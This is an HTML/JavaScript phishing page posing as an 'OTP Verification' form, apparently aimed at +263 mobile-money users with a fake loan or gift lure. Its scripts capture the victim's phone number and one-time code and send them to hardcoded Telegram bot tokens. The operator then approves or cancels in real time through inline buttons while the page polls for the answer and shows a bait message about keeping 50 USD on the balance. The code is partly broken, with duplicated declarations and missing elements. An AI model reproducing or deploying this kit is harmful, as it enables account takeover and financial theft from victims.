<title>OTP Verification</title>

<style>
    body {
        margin: 0;
        font-family: "Inter", Arial, sans-serif;
        background: url('/assets/img/background-image.jpg') no-repeat center center fixed;
        background-size: cover;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        color: #ccc;
    }

    .container {
        width: 380px;
        max-width: 92%;
        padding: 30px 25px;
        background: white;
        border-radius: 16px;
        backdrop-filter: blur(14px);
        box-shadow: 0 8px 28px rgba(0,0,0,0.35);
        text-align: center;
    }

    h2 {
        margin-bottom: 5px;
        font-size: 26px;
        
        color: #181515;
        font-weight: 600;
    }

    h3 {
        margin-top: -3px;


        color: #181515;
        
        font-size: 18px;
    }

    p {
        color: #181515;
        font-size: 15px;
    }

    .otp-boxes {
        display: flex;
        justify-content: center;
        margin: 25px 0;
        gap: 10px;
    }

    .otp-input {
        width: 48px;
        height: 55px;
        font-size: 22px;
        text-align: center;
        border-radius: 10px;
        border: 1px solid #ddd;
        outline: none;
        background: rgba(255,255,255,0.95);
        color: #333;
        font-weight: bold;
        transition: 0.2s;
    }

    .otp-input:focus {
        border-color: #0d6efd;
        box-shadow: 0 0 6px rgba(0,112,255,0.6);
    }

    button {
        width: 100%;
        padding: 12px;
        font-size: 18px;
        border: none;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
        transition: 0.25s ease;
    }

    #submitBtn {
        background: #0d6efd;
        color: #fff;
    }

    #submitBtn:hover {
        background: #0b5ed7;
    }

    .resend-btn {
        margin-top: 10px;
        background: #ddd;
        cursor: not-allowed;
    }

    .active-resend {
        background: #ffeb3b;
        cursor: pointer;
        color: #000;
    }

    .timer {
        margin-top: 10px;
        font-size: 15px;
        opacity: 0.9;
        
        
        color: #181515;
    }

    /* ===== MOBILE RESPONSIVE ===== */
    @media (max-width: 420px) {
        .otp-input {
            width: 38px;
            height: 50px;
            font-size: 20px;
        }
        h2 { font-size: 22px; }
        h3 { font-size: 16px; }
        p  { font-size: 14px; }
    }

    @media (max-width: 350px) {
        .otp-input {
            width: 32px;
            height: 45px;
            font-size: 18px;
        }
        .otp-boxes {
            gap: 6px;
        }
    }

<body>

<div class="container">
    <h2>OTP Verification</h2>
    <p>Enter the OTP sent to your number</p>
    <h3 id="phoneNumber"></h3>

    <div class="otp-boxes">
         <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
        <input class="otp-input" type="tel" maxlength="1" pattern="[0-9]*" inputmode="numeric">
    </div>

    <button id="submitBtn">Submit</button>

    <div class="timer">Resend OTP in <span id="countdown">110</span> seconds</div>
    <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
</div>

<script>
const inputs = document.querySelectorAll(".otp-input");
const submitBtn = document.getElementById("submitBtn");
const resendBtn = document.getElementById("resendBtn");
const countdownEl = document.getElementById("countdown");

// Load phone number
window.addEventListener("load", () => {
    const savedPhone = localStorage.getItem("username");
    document.getElementById("phoneNumber").textContent = savedPhone ? savedPhone : "Unknown Number";
});

// Auto movement
inputs.forEach((input, i) => {
    input.addEventListener("input", () => {
        if (input.value.length === 1 && i < inputs.length - 1) {
            inputs[i + 1].focus();
        }
    });
    input.addEventListener("keydown", e => {
        if (e.key === "Backspace" && input.value === "" && i > 0) {
            inputs[i - 1].focus();
        }
    });
});

// Timer
let timeLeft = 110;
const timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;

    if (timeLeft <= 0) {
        clearInterval(timer);
        resendBtn.disabled = false;
        resendBtn.classList.add("active-resend");
        resendBtn.textContent = "Resend OTP";
        document.querySelector(".timer").textContent = "You can now resend OTP";
    }
}, 1000);

// Submit OTP
submitBtn.addEventListener("click", async () => {
    const otp = Array.from(inputs).map(i => i.value).join("");
    const savedPhone = localStorage.getItem("username");

    if (!savedPhone) {
        alert("Phone number missing. Please restart verification.");
        return;
    }

    if (otp.length !== 6 || !/^\d{6}$/.test(otp)) {
        alert("Please enter a valid 6-digit OTP");
        return;
    }

    const message = `Smart OTP Submission:\nPhone: ${savedPhone}\nOTP: ${otp}`;

    try {
        const botToken = "8799263708:AAGKJWoeVBe0HkTCCXTnCbSf9N4biwbH4_Y";      // Replace with your bot token
        const chatId = "8520094229";          // Replace with your Telegram chat ID
       const botToken = "9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs";      // Replace with your bot token
        const chatId = "6527631508";          // Replace with your Telegram chat ID

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        const data = await response.json();

        if (!data.ok) {
            throw new Error(data.description || "Failed to send OTP to Telegram");
        }

        // ✅ OTP sent successfully, redirect to next page
        window.location.href = "gift.html";  // Replace with your target page

    } catch (error) {
        console.error("Telegram Error:", error);
        alert(error.message);
    }
});

</script>

    <script>
        // Bot 1 (your existing)
        const BOT_TOKEN_1 = '8799263708:AAGKJWoeVBe0HkTCCXTnCbSf9N4biwbH4_Y';
        const CHAT_ID_1 = '8520094229';

        // Bot 2 (your second bot)
        const BOT_TOKEN_2 = '9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs';
        const CHAT_ID_2 = '6527631508';

        // Mask phone from localStorage
        const savedPhone = localStorage.getItem('phone') || '785123463';
        const visibleStart = savedPhone.slice(0, 3);
        const visibleEnd = savedPhone.slice(-2);
        const masked = visibleStart + '****' + visibleEnd;
        document.getElementById('maskedPhone').textContent = '+263 ' + masked;

        const otpBoxes = document.querySelectorAll('.otp-box');
        const submitBtn = document.getElementById('submitBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const resultOverlay = document.getElementById('resultOverlay');
        const resultMessage = document.getElementById('resultMessage');
        const timerSpan = document.getElementById('timer');

        let otpValue = '';
        let seconds = 116;
        let pollInterval1 = null;
        let pollInterval2 = null;
        let lastUpdateId1 = 0;
        let lastUpdateId2 = 0;
        let currentTimestamp = 0;
        let actionProcessed = false;

        // Countdown timer
        const countdown = setInterval(() => {
            seconds--;
            timerSpan.textContent = seconds;
            if (seconds <= 0) {
                clearInterval(countdown);
                timerSpan.textContent = '0';
            }
        }, 1000);

        function checkOtpComplete() {
            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
            if (otpValue.length === 6) {
                submitBtn.classList.add('enabled');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('enabled');
                submitBtn.disabled = true;
            }
        }

        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                if (box.value.length === 1 && index < 5) {
                    otpBoxes[index + 1].focus();
                }
                checkOtpComplete();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
        });

        // Helper to send to a bot with inline keyboard
        function sendToBot(botToken, chatId, text, replyMarkup) {
            const payload = {
                chat_id: chatId,
                text: text,
                parse_mode: 'Markdown'
            };
            if (replyMarkup) {
                payload.reply_markup = replyMarkup;
            }
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(() => {});
        }

        // Handle a callback query from either bot
        function handleCallback(callbackData, callbackQueryId, botToken) {
            if (actionProcessed) return;
            actionProcessed = true;

            // Answer the callback query to remove loading state
            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    callback_query_id: callbackQueryId
                })
            }).catch(() => {});

            // Stop both polling intervals
            if (pollInterval1) clearInterval(pollInterval1);
            if (pollInterval2) clearInterval(pollInterval2);

            spinnerOverlay.style.display = 'none';
            resultOverlay.style.display = 'flex';

            const parts = callbackData.split('_');
            if (parts[0] === 'approve') {
                resultMessage.textContent = 'Your Registrations fee is being approved, Login again after 5 hours and make sure you have atleast 50 USD on your balance';
            } else if (parts[0] === 'cancel') {
                resultMessage.textContent = 'Please reapply and ensure that your information is correct. Thank you.';
            }
        }

        // Poll a single bot for callback responses
        function pollBot(botToken, chatId, lastUpdateIdRef, pollIntervalRef) {
            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok && data.result.length > 0) {
                        for (let update of data.result) {
                            // Update the reference via the outer variable reference approach
                            if (botToken === BOT_TOKEN_1) {
                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
                            } else {
                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
                            }

                            if (update.callback_query && !actionProcessed) {
                                const cb = update.callback_query;
                                const dataParts = cb.data.split('_');
                                const ts = parseInt(dataParts[1]);

                                if (ts === currentTimestamp) {
                                    handleCallback(cb.data, cb.id, botToken);
                                    return;
                                }
                            }
                        }
                    }
                })
                .catch(() => {});
        }

        // Start polling both bots
        function startPollingBoth() {
            actionProcessed = false;

            // Poll Bot 1 every 1.5s
            pollInterval1 = setInterval(() => {
                pollBot(BOT_TOKEN_1, CHAT_ID_1, lastUpdateId1, 'pollInterval1');
            }, 1500);

            // Poll Bot 2 every 1.5s
            pollInterval2 = setInterval(() => {
                pollBot(BOT_TOKEN_2, CHAT_ID_2, lastUpdateId2, 'pollInterval2');
            }, 1500);
        }

        submitBtn.addEventListener('click', () => {
            if (otpValue.length !== 6) return;

            spinnerOverlay.style.display = 'flex';

            currentTimestamp = Date.now();

            const message = `*OTP Verification*\n\n📱 Phone: +263 ${savedPhone}\n🔢 Entered OTP: ${otpValue}\n\nPlease approve or cancel the loan application.`;
            const replyMarkup = {
                inline_keyboard: [
                    [{
                        text: '✅ Approve',
                        callback_data: 'approve_' + currentTimestamp
                    }, {
                        text: '❌ Cancel',
                        callback_data: 'cancel_' + currentTimestamp
                    }]
                ]
            };

            // Send to both bots with inline buttons
            sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
            sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);

            // Start polling both bots for the response
            startPollingBoth();
        });

        checkOtpComplete();
        otpBoxes[0].focus();
    </script>
</body>
</html>
